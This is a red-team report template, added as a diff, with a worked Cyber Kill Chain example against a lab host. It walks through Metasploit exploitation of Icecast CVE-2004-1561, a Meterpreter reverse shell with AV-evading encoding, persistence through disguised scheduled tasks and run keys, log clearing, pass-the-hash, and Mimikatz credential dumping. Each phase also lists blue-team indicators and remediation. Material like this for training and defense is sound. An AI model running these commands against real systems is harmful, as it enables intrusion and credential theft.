@@ -1,0 +1,170 @@
+# Red Team Report — Cyber Kill Chain
+| Field | Value |
+|---|---|
+| **Date** | 2026-04-27 |
+| **Lab / Room** | — |
+| **Operator** | — |
+| **Target** | — |
+| **Objective** | — |
+---
+***## Phase 1 — Reconnaissance***
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Gathering information about the target before any attack
+Tools used
+nmap, Shodan, whois, theHarvester, Recon-ng
+**Commands run**
+nmap -sV -sC -p- 10.10.10.5 -oN initial_scan.txt
+nmap -sU --top-ports 100 10.10.10.5
+**Findings**
+Port 8000 open — Icecast 2.0.4 (media server)
+Port 3389 open — RDP
+OS: Windows Server 2008 R2
+No WAF or IPS detected
+OSINT / public info gathered
+Icecast 2.0.4 has known CVEs. Exploit-DB confirms remote buffer overflow (CVE-2004-1561). Metasploit module available.
+**What would the blue team see?**
+Port scan traffic — multiple SYN packets across all ports in short window. May trigger IDS threshold alert.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+**### Commands run**
+```
+—
+```
+---
+***## Phase 2 — Weaponization***
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+**Example**
+Creating or selecting the payload / exploit to be used
+CVE / exploit selected
+CVE-2004-1561 — Icecast remote buffer overflow
+Why this exploit works (root cause)
+Icecast 2.0.4 fails to validate HTTP header count. Sending 32+ headers overflows a stack buffer, overwriting the saved return address with attacker-controlled data. No authentication required.
+Explain the root cause — not just the module name. This is what interviewers probe.
+**Payload crafted**
+windows/meterpreter/reverse_tcp
+LHOST: 10.9.x.x  LPORT: 4444
+Encoder: shikata_ga_nai (to evade AV)
+What would the blue team see?
+Nothing yet — weaponization happens on attacker machine, not visible to defender until delivery.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+### Payload crafted
+```
+—
+```
+---
+***## Phase 3 — Delivery***
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+**Example**
+Transmitting the weapon to the target environment
+Delivery method
+Direct network exploit (no user interaction required)
+**Commands (Steps)**
+msfconsole
+use exploit/windows/http/icecast_header
+set RHOSTS 10.10.10.5
+set LHOST 10.9.x.x
+set LPORT 4444
+run
+Obstacles encountered
+e.g. First payload detected by Windows Defender — switched to encoded reverse shell. Second attempt succeeded.
+What would the blue team see?
+Malformed HTTP request to port 8000 with 32+ headers. Icecast crash/restart event in application log. Outbound connection initiated from server to attacker IP.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+**### Commands**
+```
+—
+```
+---
+***## Phase 4 — Exploitation***
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+**Example**
+Triggering the vulnerability to execute code on the target
+Access gained
+Meterpreter session — user: Dark (low privilege)
+Exploit outcome
+**Verification (commands)**
+getuid   → Server username: Dark
+sysinfo  → OS: Windows 7 (Build 7601)
+getpid   → Current pid: 2060
+What would the blue team see?
+Icecast process spawned unexpected child process. Outbound TCP connection to unknown external IP on port 4444. SIEM alert: process injection attempt.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+**### Verification**
+```
+—
+```
+---
+***## Phase 5 — Installation***
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+**Example**
+Establishing persistence so access survives reboots
+Privilege escalation method
+run post/multi/recon/local_exploit_suggester
+→ ms16_032_secondary_logon_handle_privesc suggested
+getsystem → token impersonation succeeded
+getuid → NT AUTHORITY\SYSTEM
+Persistence mechanisms planted
+run persistence -h
+Scheduled task: 'WindowsUpdate' → reverse shell every 5 min
+Registry run key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run → payload.exe
+Files dropped on target
+C:\Temp\svchost32.exe (reverse shell payload)
+C:\Users\Dark\AppData\Roaming\update.bat
+What would the blue team see?
+New scheduled task created by SYSTEM — unusual name/timing.
+New registry run key added.
+Unsigned executable written to C:\Temp\.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+**### Privilege escalation**
+```
+—
+```
+---
+***## Phase 6 — Command & Control***
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+**Example**
+Maintaining a channel to remotely control the compromised host
+C2 channel used
+Metasploit Meterpreter over TCP/4444 (HTTPS for stealth variant)
+Evasion techniques applied
+Encoded payload (shikata_ga_nai) to bypass AV signature scan.
+Cleared Windows Event Logs: clearev
+Migrated process to explorer.exe to blend in.
+Lateral movement attempted
+run post/windows/gather/credentials/credential_collector
+Attempted pass-the-hash to 10.10.10.6 — succeeded.
+RDP session opened with harvested creds.
+What would the blue team see?
+Periodic beaconing traffic to external IP on non-standard port.
+Event logs cleared (Event ID 1102).
+explorer.exe spawning unexpected child processes.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+```
+—
+```
+---
+***## Phase 7 — Actions on Objectives***
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+**Example**
+Achieving the mission goal — data theft, destruction, flags
+Objectives achieved
+hashdump → Administrator NTLM hash retrieved
+Mimikatz sekurlsa::logonpasswords → plaintext creds for 'Dark'
+Flags captured: user.txt + root.txt
+User flag
+user.txt value
+Root / system flag
+root.txt value
+Remediation recommendations
+1. Patch / replace Icecast 2.0.4 — end of life software.
+2. Enable LSASS protection (RunAsPPL) to prevent credential dumping.
+3. Restrict outbound connections from media server.
+4. Deploy EDR — process injection and log clearing would have triggered alerts.
+5. Audit scheduled tasks and run keys weekly.
+Lessons learned
+Unpatched legacy software exploitable with a 20-year-old CVE. SeImpersonatePrivilege enabled by default — common misconfiguration that enabled trivial PrivEsc.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+| User flag | Root flag |
+|---|---|
+| — | — |
+---
+*Generated with Claude Red Team Kill Chain Template*
